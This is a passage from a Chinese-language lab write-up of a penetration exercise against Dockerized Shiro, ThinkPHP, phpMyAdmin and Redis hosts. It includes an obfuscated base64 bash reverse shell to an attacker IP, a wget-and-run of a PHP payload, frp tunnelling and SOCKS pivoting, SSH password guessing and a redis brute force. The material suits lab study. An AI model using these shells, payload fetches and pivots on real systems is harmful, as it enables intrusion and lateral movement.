+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://192.168.100.2:8080 code:302 len:0      title:None 跳转url: http://192.168.100.2:8080/login;<span style=color:#79c0ff>jsessionid</span><span style=color:#ff7b72;font-weight:700>=</span>64E76231AB0492BF3E940E05FEB02E58
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://192.168.100.3      code:200 len:931    title:None
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://192.168.100.1:8080/login;<span style=color:#79c0ff>jsessionid</span><span style=color:#ff7b72;font-weight:700>=</span>A4DC7661A1A9108ACF39363918EEC791 code:200 len:2608   title:Login Page
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://192.168.100.2:8080/login;<span style=color:#79c0ff>jsessionid</span><span style=color:#ff7b72;font-weight:700>=</span>64E76231AB0492BF3E940E05FEB02E58 code:200 len:2608   title:Login Page
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key <span style=color:#ff7b72;font-weight:700>[{</span>key kPH+bIxk5D2deZiIxcaaaA<span style=color:#ff7b72;font-weight:700>==}</span> <span style=color:#ff7b72;font-weight:700>{</span>mode cbc<span style=color:#ff7b72;font-weight:700>}]</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> PocScan http://192.168.100.2:8080/ poc-yaml-shiro-key <span style=color:#ff7b72;font-weight:700>[{</span>mode cbc<span style=color:#ff7b72;font-weight:700>}</span> <span style=color:#ff7b72;font-weight:700>{</span>key kPH+bIxk5D2deZiIxcaaaA<span style=color:#ff7b72;font-weight:700>==}]</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> PocScan http://192.168.100.3 poc-yaml-thinkphp5-controller-rce 
+</span></span></code></pre></div><h3 id=配置端口转发>配置端口转发</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>192.168.122.102 wsl kali
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>192.168.100.2 shiro
+</span></span><span style=display:flex><span>192.168.100.3 thinkphp
+</span></span></code></pre></div><p>现在的网络环境为
+<img alt=|600 src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_5.png></p><p>接下来需要配置端口转发了,这个我没啥经验,用我wsl里面装过的frp吧</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wsl kali
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>l1uyun workspace/frp » ./frps -c frps.toml
+</span></span><span style=display:flex><span>2024-08-19 09:57:33.478 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>frps/root.go:105<span style=color:#ff7b72;font-weight:700>]</span> frps uses config file: frps.toml       
+</span></span><span style=display:flex><span>2024-08-19 09:57:33.613 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>server/service.go:237<span style=color:#ff7b72;font-weight:700>]</span> frps tcp listen on 0.0.0.0:7000
+</span></span><span style=display:flex><span>2024-08-19 09:57:33.613 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>frps/root.go:114<span style=color:#ff7b72;font-weight:700>]</span> frps started successfully
+</span></span><span style=display:flex><span>2024-08-19 09:59:30.950 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>server/service.go:576<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span> client login info: ip <span style=color:#ff7b72;font-weight:700>[</span>192.168.122.101:60698<span style=color:#ff7b72;font-weight:700>]</span> version <span style=color:#ff7b72;font-weight:700>[</span>0.59.0<span style=color:#ff7b72;font-weight:700>]</span> hostname <span style=color:#ff7b72;font-weight:700>[]</span> os <span style=color:#ff7b72;font-weight:700>[</span>linux<span style=color:#ff7b72;font-weight:700>]</span> arch <span style=color:#ff7b72;font-weight:700>[</span>amd64<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>2024-08-19 09:59:30.951 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>proxy/tcp.go:82<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>shiro<span style=color:#ff7b72;font-weight:700>]</span> tcp proxy listen port <span style=color:#ff7b72;font-weight:700>[</span>9999<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>2024-08-19 09:59:30.951 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>server/control.go:399<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span> new proxy <span style=color:#ff7b72;font-weight:700>[</span>shiro<span style=color:#ff7b72;font-weight:700>]</span> type <span style=color:#ff7b72;font-weight:700>[</span>tcp<span style=color:#ff7b72;font-weight:700>]</span> success
+</span></span><span style=display:flex><span>2024-08-19 09:59:45.095 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>proxy/proxy.go:115<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>shiro<span style=color:#ff7b72;font-weight:700>]</span> proxy closing
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>shiro
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@653a3ab3924e:/tmp# ./frpc -c shiro.toml
+</span></span><span style=display:flex><span>2024-08-19 01:59:30.648 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>sub/root.go:142<span style=color:#ff7b72;font-weight:700>]</span> start frpc service <span style=color:#ff7b72>for</span> config file <span style=color:#ff7b72;font-weight:700>[</span>shiro.toml<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>2024-08-19 01:59:30.648 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>client/service.go:294<span style=color:#ff7b72;font-weight:700>]</span> try to connect to server...
+</span></span><span style=display:flex><span>2024-08-19 01:59:30.652 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>client/service.go:286<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span> login to server success, get run id <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>2024-08-19 01:59:30.652 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>proxy/proxy_manager.go:173<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span> proxy added: <span style=color:#ff7b72;font-weight:700>[</span>shiro<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>2024-08-19 01:59:30.653 <span style=color:#ff7b72;font-weight:700>[</span>I<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>client/control.go:168<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>f73e9824ff9889ea<span style=color:#ff7b72;font-weight:700>]</span> <span style=color:#ff7b72;font-weight:700>[</span>shiro<span style=color:#ff7b72;font-weight:700>]</span> start proxy success
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-toml data-lang=toml><span style=display:flex><span>shiro.toml
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>serverAddr = <span style=color:#a5d6ff>&#34;192.168.122.102&#34;</span>
+</span></span><span style=display:flex><span>serverPort = <span style=color:#a5d6ff>7000</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[[proxies]]
+</span></span><span style=display:flex><span>name = <span style=color:#a5d6ff>&#34;shiro&#34;</span>
+</span></span><span style=display:flex><span>type = <span style=color:#a5d6ff>&#34;tcp&#34;</span>
+</span></span><span style=display:flex><span>localIP = <span style=color:#a5d6ff>&#34;192.168.110.3&#34;</span>
+</span></span><span style=display:flex><span>localPort = <span style=color:#a5d6ff>80</span>
+</span></span><span style=display:flex><span>remotePort = <span style=color:#a5d6ff>9999</span>
+</span></span></code></pre></div><p><img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_6.png></p><h2 id=thinkphp>thinkphp</h2><p><img alt=|486 src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_7.png></p><p>网站主页提示了是thinkphp5,直接找到相关工具开始利用</p><h3 id=利用>利用</h3><p>检测漏洞
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_8.png>
+拿shell</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#a5d6ff>&#39;YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK&#39;</span> |base64 -d &gt; /tmp/a.sh
+</span></span><span style=display:flex><span>chmod <span style=color:#a5d6ff>777</span> /tmp/a.sh
+</span></span><span style=display:flex><span>ls -al /tmp/a.sh
+</span></span><span style=display:flex><span>bash /tmp/a.sh
+</span></span></code></pre></div><p>但是这个shell好像弹不回来..换成php的试试
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_9.png>
+成功拿到shell</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget 192.168.122.102/ppp -O /tmp/ppp
+</span></span><span style=display:flex><span>php /tmp/ppp
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>..<span style=color:#ff7b72;font-weight:700>[</span>$<span style=color:#ff7b72;font-weight:700>]</span> &lt;<span style=color:#ff7b72;font-weight:700>()</span>&gt; pwncat  -l <span style=color:#a5d6ff>4444</span>
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>Linux 94a2babbcac5 6.5.0-13parrot1-amd64 <span style=color:#8b949e;font-style:italic>#1 SMP PREEMPT_DYNAMIC Debian 6.5.13-1parrot1 (2023-12-19) x86_64 Linux</span>
+</span></span><span style=display:flex><span>sh: w: not found
+</span></span><span style=display:flex><span><span style=color:#79c0ff>uid</span><span style=color:#ff7b72;font-weight:700>=</span>82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>gid</span><span style=color:#ff7b72;font-weight:700>=</span>82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>groups</span><span style=color:#ff7b72;font-weight:700>=</span>82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span>,82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>/bin/sh: can<span style=color:#f85149>&#39;</span>t access tty; job control turned off
+</span></span><span style=display:flex><span>/ $ <span style=color:#79c0ff>uid</span><span style=color:#ff7b72;font-weight:700>=</span>82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>gid</span><span style=color:#ff7b72;font-weight:700>=</span>82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>groups</span><span style=color:#ff7b72;font-weight:700>=</span>82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span>,82<span style=color:#ff7b72;font-weight:700>(</span>www-data<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>/ $ 
+</span></span></code></pre></div><p>这里有python3,给shell升级一下</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>which python python2 python3
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>python3 -c <span style=color:#a5d6ff>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>export <span style=color:#79c0ff>SHELL</span><span style=color:#ff7b72;font-weight:700>=</span>bash
+</span></span><span style=display:flex><span>export <span style=color:#79c0ff>TERM</span><span style=color:#ff7b72;font-weight:700>=</span>xterm-256color
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Ctrl+Z
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>stty raw -echo;fg 
+</span></span></code></pre></div><p>拿到flag</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>bash-5.1$ cat /f*
+</span></span><span style=display:flex><span>cat /f*
+</span></span><span style=display:flex><span>WSS-Studio<span style=color:#ff7b72;font-weight:700>{</span>ThinkPHP-84d786a4-b47c-4fcb-a377-be6241d5bf10<span style=color:#ff7b72;font-weight:700>}</span>
+</span></span></code></pre></div><h3 id=内网扫描-1>内网扫描</h3><p>可以看到这台thinkphp机器是有两个内网地址的</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/ $ ifconfig
+</span></span><span style=display:flex><span>eth0      Link encap:Ethernet  HWaddr 02:42:C0:A8:64:03  
+</span></span><span style=display:flex><span>          inet addr:192.168.100.3  Bcast:192.168.100.255  Mask:255.255.255.0
+</span></span><span style=display:flex><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span></span><span style=display:flex><span>          RX packets:2642 errors:0 dropped:0 overruns:0 frame:0
+</span></span><span style=display:flex><span>          TX packets:1810 errors:0 dropped:0 overruns:0 carrier:0
+</span></span><span style=display:flex><span>          collisions:0 txqueuelen:0 
+</span></span><span style=display:flex><span>          RX bytes:2271528 <span style=color:#ff7b72;font-weight:700>(</span>2.1 MiB<span style=color:#ff7b72;font-weight:700>)</span>  TX bytes:1569684 <span style=color:#ff7b72;font-weight:700>(</span>1.4 MiB<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>eth1      Link encap:Ethernet  HWaddr 02:42:0A:55:65:04  
+</span></span><span style=display:flex><span>          inet addr:10.85.101.4  Bcast:10.85.101.255  Mask:255.255.255.0
+</span></span><span style=display:flex><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span></span><span style=display:flex><span>          RX packets:14 errors:0 dropped:0 overruns:0 frame:0
+</span></span><span style=display:flex><span>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+</span></span><span style=display:flex><span>          collisions:0 txqueuelen:0 
+</span></span><span style=display:flex><span>          RX bytes:1116 <span style=color:#ff7b72;font-weight:700>(</span>1.0 KiB<span style=color:#ff7b72;font-weight:700>)</span>  TX bytes:0 <span style=color:#ff7b72;font-weight:700>(</span>0.0 B<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>lo        Link encap:Local Loopback  
+</span></span><span style=display:flex><span>          inet addr:127.0.0.1  Mask:255.0.0.0
+</span></span><span style=display:flex><span>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+</span></span><span style=display:flex><span>          RX packets:6532 errors:0 dropped:0 overruns:0 frame:0
+</span></span><span style=display:flex><span>          TX packets:6532 errors:0 dropped:0 overruns:0 carrier:0
+</span></span><span style=display:flex><span>          collisions:0 txqueuelen:1000
+</span></span><span style=display:flex><span>          RX bytes:4014368 <span style=color:#ff7b72;font-weight:700>(</span>3.8 MiB<span style=color:#ff7b72;font-weight:700>)</span>  TX bytes:4014368 <span style=color:#ff7b72;font-weight:700>(</span>3.8 MiB<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span></code></pre></div><p>上fscan扫一下内网</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>start infoscan
+</span></span><span style=display:flex><span>trying RunIcmp2
+</span></span><span style=display:flex><span>The current user permissions unable to send icmp packets
+</span></span><span style=display:flex><span>start ping
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 10.85.101.2     is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 10.85.101.1     is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 10.85.101.4     is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 10.85.101.3     is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>icmp<span style=color:#ff7b72;font-weight:700>)</span> Target 10.85.101.3     is alive
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Icmp alive hosts len is: <span style=color:#a5d6ff>4</span>
+</span></span><span style=display:flex><span>10.85.101.3:80 open
+</span></span><span style=display:flex><span>10.85.101.2:6379 open
+</span></span><span style=display:flex><span>10.85.101.4:9000 open
+</span></span><span style=display:flex><span>10.85.101.3:9000 open
+</span></span><span style=display:flex><span>10.85.101.1:22 open
+</span></span><span style=display:flex><span>10.85.101.4:80 open
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> alive ports len is: <span style=color:#a5d6ff>6</span>
+</span></span><span style=display:flex><span>start vulscan
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> FCGI 10.85.101.3:9000
+</span></span><span style=display:flex><span>Status: <span style=color:#a5d6ff>403</span> Forbidden
+</span></span><span style=display:flex><span>X-Powered-By: PHP/8.2.8
+</span></span><span style=display:flex><span>Content-type: text/html; <span style=color:#79c0ff>charset</span><span style=color:#ff7b72;font-weight:700>=</span>UTF-8
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Access denied.
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://10.85.101.4        code:200 len:931    title:None
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> FCGI 10.85.101.4:9000
+</span></span><span style=display:flex><span>Status: <span style=color:#a5d6ff>403</span> Forbidden
+</span></span><span style=display:flex><span>X-Powered-By: PHP/7.3.33
+</span></span><span style=display:flex><span>Content-type: text/html; <span style=color:#79c0ff>charset</span><span style=color:#ff7b72;font-weight:700>=</span>UTF-8
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Access denied.
+</span></span><span style=display:flex><span>stderr:Access to the script <span style=color:#a5d6ff>&#39;/etc/issue&#39;</span> has been denied <span style=color:#ff7b72;font-weight:700>(</span>see security.limit_extensions<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>plesa try other path,as -path /www/wwwroot/index.php
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://10.85.101.3        code:200 len:19411  title:phpMyAdmin
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> InfoScan http://10.85.101.3        <span style=color:#ff7b72;font-weight:700>[</span>phpMyAdmin<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> PocScan http://10.85.101.3 poc-yaml-php-cgi-cve-2012-1823
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> PocScan http://10.85.101.4 poc-yaml-php-cgi-cve-2012-1823
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> PocScan http://10.85.101.4 poc-yaml-thinkphp5-controller-rce
+</span></span><span style=display:flex><span>已完成 6/8 <span style=color:#ff7b72;font-weight:700>[</span>-<span style=color:#ff7b72;font-weight:700>]</span> redis 10.85.101.2:6379 sysadmin &lt;nil&gt;
+</span></span><span style=display:flex><span>已完成 7/8 <span style=color:#ff7b72;font-weight:700>[</span>-<span style=color:#ff7b72;font-weight:700>]</span> ssh 10.85.101.1:22 root !QAZ2wsx ssh: handshake failed: ssh: unable to authenticate, attempted methods <span style=color:#ff7b72;font-weight:700>[</span>none password<span style=color:#ff7b72;font-weight:700>]</span>, no supported methods remain
+</span></span><span style=display:flex><span>已完成 7/8 <span style=color:#ff7b72;font-weight:700>[</span>-<span style=color:#ff7b72;font-weight:700>]</span> ssh 10.85.101.1:22 root 1q2w3e ssh: handshake failed: ssh: unable to authenticate, attempted methods <span style=color:#ff7b72;font-weight:700>[</span>none password<span style=color:#ff7b72;font-weight:700>]</span>, no supported methods remain
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>已完成 7/8 <span style=color:#ff7b72;font-weight:700>[</span>-<span style=color:#ff7b72;font-weight:700>]</span> ssh 10.85.101.1:22 admin admin123 ssh: handshake failed: ssh: unable to authenticate, attempted methods <span style=color:#ff7b72;font-weight:700>[</span>none password<span style=color:#ff7b72;font-weight:700>]</span>, no supported methods remain
+</span></span><span style=display:flex><span>已完成 7/8 <span style=color:#ff7b72;font-weight:700>[</span>-<span style=color:#ff7b72;font-weight:700>]</span> ssh 10.85.101.1:22 admin 123456~a ssh: handshake failed: ssh: unable to authenticate, attempted methods <span style=color:#ff7b72;font-weight:700>[</span>none password<span style=color:#ff7b72;font-weight:700>]</span>, no supported methods remain
+</span></span><span style=display:flex><span>已完成 7/8 <span style=color:#ff7b72;font-weight:700>[</span>-<span style=color:#ff7b72;font-weight:700>]</span> ssh 10.85.101.1:22 admin Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods <span style=color:#ff7b72;font-weight:700>[</span>none password<span style=color:#ff7b72;font-weight:700>]</span>, no supported methods remain
+</span></span><span style=display:flex><span>已完成 8/8
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> 扫描结束,耗时: 7m48.941223927s
+</span></span></code></pre></div><h3 id=配置socks代理>配置socks代理</h3><p>我这为啥又出现了一个多的ip&mldr;.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>10.85.101.4 thinkphp
+</span></span><span style=display:flex><span>10.85.101.3 phpmyadmin
+</span></span><span style=display:flex><span>10.85.101.2 redis
+</span></span><span style=display:flex><span>10.85.101.1 ???  是运行docker的parrot???
+</span></span></code></pre></div><p>现在的环境为
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_10.png>
+这里就直接配置个socks代理吧</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-toml data-lang=toml><span style=display:flex><span>serverAddr = <span style=color:#a5d6ff>&#34;192.168.122.102&#34;</span>
+</span></span><span style=display:flex><span>serverPort = <span style=color:#a5d6ff>7000</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[[proxies]]
+</span></span><span style=display:flex><span>name = <span style=color:#a5d6ff>&#34;kali2tp&#34;</span>
+</span></span><span style=display:flex><span>type = <span style=color:#a5d6ff>&#34;tcp&#34;</span>
+</span></span><span style=display:flex><span>remotePort = <span style=color:#a5d6ff>9998</span>
+</span></span><span style=display:flex><span>[proxies.plugin]
+</span></span><span style=display:flex><span>type = <span style=color:#a5d6ff>&#34;socks5&#34;</span>
+</span></span></code></pre></div><p>配完之后
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_11.png>
+配置一下proxychains
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_12.png></p><h2 id=redis>redis</h2><p>使用proxychains来实现使用代理</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>☁  workspace  sudo proxychains4  nmap -sT -Pn 10.85.101.2 -p6379 --script<span style=color:#ff7b72;font-weight:700>=</span><span style=color:#a5d6ff>&#34;*redis*&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> config file found: /etc/proxychains4.conf
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> DLL init: proxychains-ng 4.17
+</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#ff7b72;font-weight:700>(</span> https://nmap.org <span style=color:#ff7b72;font-weight:700>)</span> at 2024-08-19 11:01 CST
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> Strict chain  ...  192.168.122.102:9998  ...  10.85.101.2:6379  ...  OK
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#ff7b72>for</span> 10.85.101.2
+</span></span><span style=display:flex><span>Host is up <span style=color:#ff7b72;font-weight:700>(</span>0.0028s latency<span style=color:#ff7b72;font-weight:700>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE
+</span></span><span style=display:flex><span>6379/tcp open  redis
+</span></span><span style=display:flex><span>|_redis-info: ERROR: Script execution failed <span style=color:#ff7b72;font-weight:700>(</span>use -d to debug<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>| redis-brute:
+</span></span><span style=display:flex><span>|   Accounts:
+</span></span><span style=display:flex><span>|     <span style=color:#a5d6ff>12345</span> - Valid credentials
+</span></span><span style=display:flex><span>|_  Statistics: Performed <span style=color:#a5d6ff>5</span> guesses in <span style=color:#a5d6ff>1</span> seconds, average tps: 5.0
+</span></span><span style=display:flex><span>
